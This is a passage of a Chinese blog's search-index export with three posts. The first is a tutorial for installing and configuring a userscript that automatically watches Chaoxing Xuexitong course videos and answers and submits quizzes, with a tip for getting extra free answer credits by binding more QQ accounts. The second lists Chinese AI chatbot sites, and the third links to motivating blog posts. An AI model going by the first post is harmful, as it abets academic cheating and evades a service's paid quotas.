<p>进来之后点击图示右上角安装（由于我已经安装过了所以图示是 remove）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/3.jpg"
                      alt="启用脚本猫"
                ></p>
<p>然后进入浏览器扩展中心可以看到已经安装好了，启用该扩展</p>
<p>然后点击获取脚本 <a class="link"   href="https://scriptcat.org/zh-CN/script-show-page/1127" >超星学习通脚本猫脚本<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/4.jpg"
                      alt="安装脚本"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/5.jpg"
                      alt="安装脚本"
                ></p>
<p>由于我已经安装完了，这里显示的是重新安装和更新</p>
<p>至此脚本已经安装完毕</p>
<h2 id="脚本配置"><a href="#脚本配置" class="headerlink" title="脚本配置"></a>脚本配置</h2><p>接下来就是开始配置脚本</p>
<p>点击进入 <a class="link"   href="https://passport2.chaoxing.com/login?fid=&newversion=true&refer=https://i.chaoxing.com#/" >超星学习通官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>登录账号进入个人空间</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/6.jpg"
                      alt="配置脚本"
                ></p>
<p>点击对应课程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/7.jpg"
                      alt="配置脚本"
                ></p>
<p>点击确定跳转到脚本页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/8.jpg"
                      alt="配置脚本"
                ></p>
<ol>
<li>首先任务设置全选就行</li>
<li>自动提交也点</li>
<li>题库 token 需要绑定 QQ<ol>
<li>注意 ↓</li>
<li>一个 QQ 只能绑定一个账号</li>
<li>绑定成功可以获得答题次数赠送</li>
<li>如果 QQ 之前绑定过其他 token，绑定会失败，一个 QQ 只能绑定一个账号</li>
<li>绑定成功可以获得答题次数赠送</li>
<li>如果 QQ 之前绑定过其他 token，绑定会失败</li>
</ol>
</li>
<li>视频倍速自己酌情考虑</li>
<li>正确率 0-100</li>
<li>点击保存</li>
<li>总开关默认是只看一集，闯关模式是连续刷，适合挂着不管</li>
<li>点击任意开关即可开刷</li>
</ol>
<blockquote>
<p>在这里提一嘴，有关于脚本收费问题，QQ 号绑定会赠送 100 次答题次数</p>
<p>答题次数的收费标准是 1 元&#x2F;200 题，5 元&#x2F;2000 题，10&#x2F;元 5000 题</p>
<p>有个纯白嫖的方法就是换 QQ 号绑定，官方的说法是每个 QQ 只能绑定一个 token，但没说每个 token 只能用一个 QQ 绑定</p>
<p><font color='red'> 此收费项目与本人无关，酌情消费 </font></p>
<p><font color='red'> token 不要泄露！！token 不要泄露！！token 不要泄露！！</font> 重要的事情说三遍</p>
</blockquote>
<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>至此已经基本结束了</p>
<h1 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h1><p>放一下我自己的刷课记录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/9.jpg"
                      alt="记录展示"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/10.jpg"
                      alt="记录展示"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/11.jpg"
                      alt="记录展示"
                ></p>
<h1 id="用户协议"><a href="#用户协议" class="headerlink" title="用户协议"></a>用户协议</h1><ol>
<li>使用本教程即代表同意此用户协议</li>
<li>使用本教程所带来的后果均由用户个人承担</li>
<li>本教程所涉及的消费均与本人无关</li>
<li>本教程未经本人允许禁止转载</li>
<li>不要跟我杠，杠就是你对</li>
<li>我本人有 <strong>抑郁症</strong> 病史，玩过小红书，若本人遭受任何形式的网络暴力 (包括但不限于发送淫 &#x2F; 秽血 &#x2F; 腥图片，问候我家人), 并出现极端行为。一切都是 <strong>本人的错</strong> 和大家无关</li>
<li>本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任</li>
<li><font color='blue'> 博主 W1ndys 享有最终解释权 </font></li>
</ol>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>线上课答案库</tag>
        <tag>超星学习通</tag>
        <tag>刷课脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>适合个体用户使用的国内AI大模型</title>
    <url>/posts/75294ae4.html</url>
    <content><![CDATA[<h2 id="智谱-AI（GLM-大模型）"><a href="#智谱-AI（GLM-大模型）" class="headerlink" title="智谱 AI（GLM 大模型）"></a>智谱 AI（GLM 大模型）</h2><p>智谱 AI（GLM 大模型） <a class="link"   href="http://chatglm.cn/" >http://chatglm.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="阿里通义千问"><a href="#阿里通义千问" class="headerlink" title="阿里通义千问"></a>阿里通义千问</h2><p>阿里通义千问： <a class="link"   href="http://qianwen.aliyun.com/" >http://qianwen.aliyun.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="百川智能（百川大模型）"><a href="#百川智能（百川大模型）" class="headerlink" title="百川智能（百川大模型）"></a>百川智能（百川大模型）</h2><p>百川智能（百川大模型） <a class="link"   href="http://www.baichuan-ai.com/" >http://www.baichuan-ai.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="讯飞星火"><a href="#讯飞星火" class="headerlink" title="讯飞星火"></a>讯飞星火</h2><p>讯飞星火： <a class="link"   href="http://xinghuo.xfyun.cn/" >http://xinghuo.xfyun.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="360-智脑"><a href="#360-智脑" class="headerlink" title="360 智脑"></a>360 智脑</h2><p>360 智脑 ： <a class="link"   href="http://ai.360.cn/" >http://ai.360.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>个人感觉，并不是传统意义上的 AI，而是一个自动化搜索引擎</p>
<h2 id="天工-AI"><a href="#天工-AI" class="headerlink" title="天工 AI"></a>天工 AI</h2><p>天工 AI： <a class="link"   href="http://search.tiangong.cn/" >http://search.tiangong.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="中科院（紫东太初大模型）"><a href="#中科院（紫东太初大模型）" class="headerlink" title="中科院（紫东太初大模型）"></a>中科院（紫东太初大模型）</h2><p>中科院（紫东太初大模型）<a class="link"   href="http://xihe.mindspore.cn/" >http://xihe.mindspore.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="百度（文心一言）"><a href="#百度（文心一言）" class="headerlink" title="百度（文心一言）"></a>百度（文心一言）</h2><p>百度（文心一言） <a class="link"   href="https://yiyan.baidu.com/#/" >https://yiyan.baidu.com/#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="字节（云雀大模型）"><a href="#字节（云雀大模型）" class="headerlink" title="字节（云雀大模型）"></a>字节（云雀大模型）</h2><p>字节（云雀大模型） <a class="link"   href="http://www.doubao.com/" >http://www.doubao.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="上海人工智能实验室（书生通用大模型）"><a href="#上海人工智能实验室（书生通用大模型）" class="headerlink" title="上海人工智能实验室（书生通用大模型）"></a>上海人工智能实验室（书生通用大模型）</h2><p>上海人工智能实验室（书生通用大模型） <a class="link"   href="http://intern-ai.org.cn/" >http://intern-ai.org.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="MiniMax（ABAB-大模型）"><a href="#MiniMax（ABAB-大模型）" class="headerlink" title="MiniMax（ABAB 大模型）"></a>MiniMax（ABAB 大模型）</h2><p>MiniMax（ABAB 大模型） <a class="link"   href="https://api.minimax.chat/" >https://api.minimax.chat<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>AI</category>
        <category>ChatGPT</category>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>ChatGPT</tag>
        <tag>AI</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>那些激励我的文章</title>
    <url>/posts/9099d312.html</url>
    <content><![CDATA[<h1 id="那些激励我的文章"><a href="#那些激励我的文章" class="headerlink" title="那些激励我的文章"></a>那些激励我的文章</h1><p>今天在刷盛师傅的博客，有这么一篇文章激励了我，看到了他 2023 复盘，各种比赛各种奖项，膜拜大佬，激励自己前进。</p>
<p>决定写个收集文章，收集曾经激励过我的，希望我以后也能成为别人的动力。</p>
<ul>
<li><p><a class="link"   href="https://www.codexploit.cn/2023%E5%A4%8D%E7%9B%98/" >h3110w0r1d’s Blog——2023 复盘<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="https://interviewguide.cn/#/" >阿秀的学习笔记<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>随笔</category>
        <category>Power</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>Power</tag>
        <tag>激励</tag>
        <tag>前进的动力</tag>
        <tag>膜拜大佬</tag>
      </tags>
  </entry>
</search>
